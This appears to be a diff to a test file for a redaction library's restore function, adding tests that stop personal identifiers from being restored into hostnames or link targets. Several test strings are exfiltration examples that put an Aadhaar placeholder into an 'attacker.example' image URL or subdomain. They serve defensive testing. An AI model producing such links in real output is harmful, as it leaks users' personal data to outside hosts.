@@ -8,6 +8,7 @@ import { describe, expect, it } from 'vitest';
 import { PlaceholderMapping } from '../../../src/redaction/mapping.js';
 import type { PlaceholderNamespace } from '../../../src/redaction/placeholder.js';
 import { restore } from '../../../src/redaction/restore.js';
+import { growthRatio, MAX_GROWTH_RATIO } from '../../support/linear-time.js';
 
 function mappingWith(
   entries: readonly [namespace: PlaceholderNamespace, value: string][],
@@ -222,6 +223,58 @@ describe('restore: restoration safety (design doc)', () => {
     const reply = '![x](https://attacker.example/?d=[AADHAAR_1])';
     expect(restore(reply, mapping, { restoreInUnsafeRegions: true })).toBe(
       '![x](https://attacker.example/?d=234567890123)',
+    );
+  });
+});
+
+describe('restore: the host rule (ADR-018)', () => {
+  // A value written where it becomes the first label of a hostname: a
+  // linkified or clicked link would send it to that host's DNS and server.
+  it.each([
+    ['bare space, "."', 'Visit Aadhaar 1.attacker.example/x'],
+    ['bare space, "-"', 'Visit Aadhaar 1-x.attacker.example/x'],
+    ['bare underscore, "."', 'Visit AADHAAR_1.attacker.example'],
+    ['bare underscore, "-"', 'Visit Aadhaar_1-x.attacker.example'],
+    ['bracketed, "."', 'Visit [AADHAAR_1].attacker.example/'],
+  ])('leaves %s unrestored', (_name, reply) => {
+    const mapping = mappingWith([['AADHAAR', '234567890123']]);
+    expect(restore(reply, mapping)).toBe(reply);
+  });
+
+  it.each([
+    ['a full stop', 'Ref: Aadhaar 1. Thanks', 'Ref: 234567890123. Thanks'],
+    ['a full stop at the end', 'Ref: AADHAAR_1.', 'Ref: 234567890123.'],
+    [
+      'a hyphen after a bracket',
+      'the [AADHAAR_1]-linked account',
+      'the 234567890123-linked account',
+    ],
+    ['a line break', 'Ref: [AADHAAR_1].\nNext', 'Ref: 234567890123.\nNext'],
+  ])('still restores before %s', (_name, reply, expected) => {
+    const mapping = mappingWith([['AADHAAR', '234567890123']]);
+    expect(restore(reply, mapping)).toBe(expected);
+  });
+
+  it('restores before a hostname when restoration safety is switched off', () => {
+    const mapping = mappingWith([['AADHAAR', '234567890123']]);
+    expect(
+      restore('Visit AADHAAR_1.attacker.example', mapping, { restoreInUnsafeRegions: true }),
+    ).toBe('Visit 234567890123.attacker.example');
+  });
+});
+
+// Bug-log 17: dropping bare matches inside brackets compared every bare
+// match with every bracketed one.
+describe('restore: linear time (bug-log 17)', () => {
+  it.each([
+    ['brackets and bare forms mixed', '[CARD_1] CARD_1 '],
+    ['placeholders in URLs', 'https://a.example/[CARD_1] '],
+    ['prose', 'word word '],
+  ])('%s', (_name, unit) => {
+    const mapping = mappingWith([['CARD', '4111111111111111']]);
+    const make = (n: number): string => unit.repeat(n);
+    expect(growthRatio(make, 5_000, (text) => restore(text, mapping))).toBeLessThan(
+      MAX_GROWTH_RATIO,
     );
   });
 });
